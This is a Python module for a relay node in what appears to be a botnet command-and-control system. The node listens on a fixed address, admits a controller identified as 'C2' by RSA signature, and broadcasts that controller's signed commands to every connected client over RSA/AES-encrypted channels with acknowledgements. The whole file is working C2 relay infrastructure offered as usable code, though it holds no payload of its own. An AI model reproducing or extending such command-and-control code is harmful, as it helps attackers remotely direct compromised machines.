import socket
import threading
import logging
import select
import uuid
import json
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from .crypto import Crypto
from .logger import LoggerFormatter

class Node:
    def __init__(self, host='172.31.32.225', port=547, debug=True):
        self.host = host
        self.port = port
        self.debug = debug
        self.running = False
        self.node_commands = ["status"]
        self.clients = {}
        self.clients_lock = threading.Lock()

        # Logger
        self.logger = logging.getLogger("node")
        self.logger.setLevel(logging.DEBUG if debug else logging.WARNING)
        if not self.logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG if debug else logging.WARNING)
            ch.setFormatter(LoggerFormatter())
            self.logger.addHandler(ch)

        # Crypto
        self.crypto = Crypto(debug)
        self.private_key, self.public_key = self.crypto.generate_rsa_keys()
        with open("pub.key", "r") as f:
            self.c2_pub = self.crypto.load_public_key(f.read().encode())

        self.node_socket = None

    #  Setup Socket 
    def setup_socket(self):
        self.logger.info(f"Starting node on {self.host}:{self.port}")
        try:
            self.node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.node_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.node_socket.bind((self.host, self.port))
            self.node_socket.listen()
            self.running = True
            self.logger.info(f"Listening on {self.host}:{self.port}")
        except Exception as e:
            self.logger.error(f"Failed to start node: {type(e).__name__}: {str(e)}")
            self.running = False

    #  Run node 
    def run(self):
        self.setup_socket()
        if not self.running:
            return
        try:
            while self.running:
                client_socket, addr = self.node_socket.accept()
                self.logger.info(f"New connection from {addr}")
                threading.Thread(target=self.handle_connection, args=(client_socket, addr), daemon=True).start()
        except KeyboardInterrupt:
            self.logger.info("Node stopped manually")
        except Exception as e:
            self.logger.error(f"Node error: {type(e).__name__}: {str(e)}")
        finally:
            self.shutdown()

    #  Verify C2 
    def verify_c2_signature(self, message, signature):
        try:
            self.c2_pub.verify(
                signature,
                message,
                padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
                hashes.SHA256()
            )
            self.logger.debug(f"Verified signature for message: {message}")
            return True
        except InvalidSignature:
            self.logger.error(f"Invalid C2 signature for message: {message}")
            return False
        except Exception as e:
            self.logger.error(f"Signature verification error: {type(e).__name__}: {str(e)}")
            return False

    #  Handle Client 
    def handle_connection(self, client_socket, addr):
        try:
            # Send node public key
            pubkey_pem = self.crypto.serialize_public_key(self.public_key)
            client_socket.send(len(pubkey_pem).to_bytes(2, 'big') + pubkey_pem)
            self.logger.debug(f"Sent public key to {addr} (len={len(pubkey_pem)})")

            # Receive client public key
            key_len_bytes = self.receive_bytes(client_socket, 2)
            if not key_len_bytes:
                self.logger.warning(f"Failed to receive public key length from {addr}")
                return self.disconnect_connection(client_socket, addr)
            key_len = int.from_bytes(key_len_bytes, 'big')
            self.logger.debug(f"Received public key length from {addr}: {key_len}")

            client_pubkey_pem = self.receive_bytes(client_socket, key_len)
            if not client_pubkey_pem:
                self.logger.warning(f"Failed to receive public key from {addr}")
                return self.disconnect_connection(client_socket, addr)
            client_pubkey = self.crypto.load_public_key(client_pubkey_pem)
            self.logger.info(f"Received public key from {addr}")

            # Store client
            with self.clients_lock:
                client_id = str(uuid.uuid4())[:8]
                self.clients[client_socket] = {"uuid": client_id, "pubkey": client_pubkey}
                self.logger.info(f"Stored client {addr} with ID {client_id}")

            # Check if client is C2
            is_c2 = self.check_c2(client_socket, addr)

            if not is_c2:
                client_socket.settimeout(10)

            # Main loop
            while self.running:
                if is_c2:
                    self.process_c2_messages(client_socket, addr)
                else:
                    threading.Event().wait(1)

        except Exception as e:
            self.logger.warning(f"Connection error from {addr}: {type(e).__name__}: {str(e)}")
        finally:
            self.disconnect_connection(client_socket, addr)

    #  Check C2 
    def check_c2(self, client_socket, addr):
        try:
            client_socket.settimeout(2)
            length_bytes = self.receive_bytes(client_socket, 2)
            client_socket.settimeout(None)
            if not length_bytes:
                self.logger.warning(f"No auth message length from {addr}")
                self.send_confirmation(client_socket, {"status": "error", "message": "No authentication message received"})
                return False

            auth_len = int.from_bytes(length_bytes, 'big')
            self.logger.debug(f"Received auth message length from {addr}: {auth_len}")
            auth_message = self.receive_bytes(client_socket, auth_len)
            if not auth_message:
                self.logger.warning(f"Failed to receive auth message from {addr}")
                self.send_confirmation(client_socket, {"status": "error", "message": "Failed to receive authentication message"})
                return False

            auth_data = json.loads(auth_message.decode())
            self.logger.debug(f"Received auth message from {addr}: {auth_data}")
            if auth_data.get("role") != "C2":
                self.logger.warning(f"Invalid role in auth message from {addr}: {auth_data.get('role')}")
                self.send_confirmation(client_socket, {"status": "error", "message": "Invalid role"})
                return False

            signature = bytes.fromhex(auth_data.get("signature", ""))
            if self.verify_c2_signature(json.dumps({"role": "C2"}).encode(), signature):
                self.logger.info(f"C2 authenticated from {addr}")
                self.send_confirmation(client_socket, {"status": "success"})
                with self.clients_lock:
                    self.clients.pop(client_socket, None)
                return True
            else:
                self.logger.error(f"Invalid C2 signature from {addr}")
                self.send_confirmation(client_socket, {"status": "error", "message": "Invalid signature"})
                return False

        except socket.timeout:
            self.logger.warning(f"C2 auth timeout from {addr}")
            self.send_confirmation(client_socket, {"status": "error", "message": "Authentication timeout"})
            return False
        except Exception as e:
            self.logger.error(f"C2 auth failed from {addr}: {type(e).__name__}: {str(e)}")
            self.send_confirmation(client_socket, {"status": "error", "message": f"Authentication failed: {str(e)}"})
            return False

    #  Process C2 Messages 
    def process_c2_messages(self, client_socket, addr):
        ready = select.select([client_socket], [], [], 1.0)
        if not ready[0]:
            return
        length_bytes = self.receive_bytes(client_socket, 2)
        if not length_bytes:
            self.logger.warning(f"No message length from {addr}")
            return
        msg_len = int.from_bytes(length_bytes, 'big')
        self.logger.debug(f"Received message length from {addr}: {msg_len}")
        message = self.receive_bytes(client_socket, msg_len)
        if not message:
            self.logger.warning(f"Failed to receive message from {addr}")
            return
        sig_len_bytes = self.receive_bytes(client_socket, 2)
        if not sig_len_bytes:
            self.logger.warning(f"No signature length from {addr}")
            return
        sig_len = int.from_bytes(sig_len_bytes, 'big')
        self.logger.debug(f"Received signature length from {addr}: {sig_len}")
        signature = self.receive_bytes(client_socket, sig_len)
        if not signature:
            self.logger.warning(f"Failed to receive signature from {addr}")
            return

        if self.verify_c2_signature(message, signature):
            self.logger.info(f"Received C2 message from {addr}: {message.decode()}")
            try:
                msg_data = json.loads(message.decode())
                if msg_data.get("action") not in self.node_commands:
                    self.send_to_all(message.decode())
                    self.logger.info(f"Forwarded command to {len(self.clients)} clients from {addr}")
            except json.JSONDecodeError as e:
                self.logger.error(f"Invalid JSON in C2 message from {addr}: {str(e)}")
        else:
            self.logger.error(f"Invalid C2 signature for message from {addr}: {message.decode()}")

    #  Disconnect 
    def disconnect_connection(self, client_socket, addr):
        with self.clients_lock:
            self.clients.pop(client_socket, None)
        try:
            client_socket.close()
            self.logger.info(f"Disconnected {addr}")
        except Exception as e:
            self.logger.warning(f"Error closing socket for {addr}: {type(e).__name__}: {str(e)}")

    #  Send 
    def send_to(self, client_socket, message):
        try:
            with self.clients_lock:
                client_data = self.clients.get(client_socket)
                if not client_data:
                    raise ConnectionError("Client not connected")

            client_pubkey = client_data["pubkey"]
            session_key = self.crypto.generate_aes_key()
            self.logger.debug(f"Generated AES key for {self.get_address(client_socket)} (len={len(session_key)})")
            encrypted_msg = self.crypto.aes_encrypt(session_key, message.encode())
            self.logger.debug(f"Encrypted message for {self.get_address(client_socket)} (len={len(encrypted_msg)})")
            encrypted_session_key = self.crypto.rsa_encrypt(client_pubkey, session_key)
            self.logger.debug(f"Encrypted session key for {self.get_address(client_socket)} (len={len(encrypted_session_key)})")

            payload = (
                len(encrypted_session_key).to_bytes(2, 'big') +
                encrypted_session_key +
                len(encrypted_msg).to_bytes(2, 'big') +
                encrypted_msg
            )
            client_socket.sendall(payload)
            self.logger.debug(f"Sent encrypted message to {self.get_address(client_socket)}")

            ready = select.select([client_socket], [], [], 5.0)
            if not ready[0]:
                raise ConnectionError(f"No ACK from {self.get_address(client_socket)}")

            length_bytes = self.receive_bytes(client_socket, 2)
            if not length_bytes:
                raise ConnectionError(f"No ACK length from {self.get_address(client_socket)}")
            ack_len = int.from_bytes(length_bytes, 'big')
            self.logger.debug(f"Received ACK length from {self.get_address(client_socket)}: {ack_len}")

            ack_encrypted = self.receive_bytes(client_socket, ack_len)
            if not ack_encrypted:
                raise ConnectionError(f"No ACK payload from {self.get_address(client_socket)}")

            ack = self.crypto.rsa_decrypt(self.private_key, ack_encrypted).decode()
            self.logger.info(f"Received ACK from {self.get_address(client_socket)}: {ack}")

        except Exception as e:
            self.logger.warning(f"Send failed to {self.get_address(client_socket)}: {type(e).__name__}: {str(e)}")
            self.disconnect_connection(client_socket, self.get_address(client_socket))

    #  Send Confirmation (Unencrypted, No ACK)
    def send_confirmation(self, client_socket, message):
        try:
            message_bytes = json.dumps(message).encode()
            client_socket.send(len(message_bytes).to_bytes(2, 'big') + message_bytes)
            self.logger.debug(f"Sent confirmation to {self.get_address(client_socket)}: {message}")
        except Exception as e:
            self.logger.warning(f"Failed to send confirmation to {self.get_address(client_socket)}: {type(e).__name__}: {str(e)}")

    #  Send 
    def send_to_all(self, message):
        with self.clients_lock:
            clients = list(self.clients.items())
        for client_socket, client_data in clients:
            self.send_to(client_socket, message)

    #  Helpers 
    def receive_bytes(self, sock, n):
        data = b''
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                self.logger.warning(f"Connection closed while receiving {n} bytes")
                return None
            data += chunk
        self.logger.debug(f"Received {len(data)} bytes")
        return data

    def get_clients(self):
        with self.clients_lock:
            return list(self.clients.items())

    def get_address(self, client):
        try:
            return client.getpeername()
        except Exception as e:
            self.logger.debug(f"Failed to get address: {type(e).__name__}: {str(e)}")
            return "unknown"

    #  Shutdown 
    def shutdown(self):
        self.logger.info("Shutting down node server")
        self.running = False
        with self.clients_lock:
            for client in list(self.clients.keys()):
                try:
                    client.close()
                    self.logger.info(f"Closed client socket during shutdown")
                except Exception as e:
                    self.logger.warning(f"Error closing client socket during shutdown: {type(e).__name__}: {str(e)}")
            self.clients.clear()
        if self.node_socket:
            try:
                self.node_socket.close()
                self.logger.info("Closed node socket")
            except Exception as e:
                self.logger.warning(f"Error closing node socket: {type(e).__name__}: {str(e)}")
        self.logger.info("Node server shut down")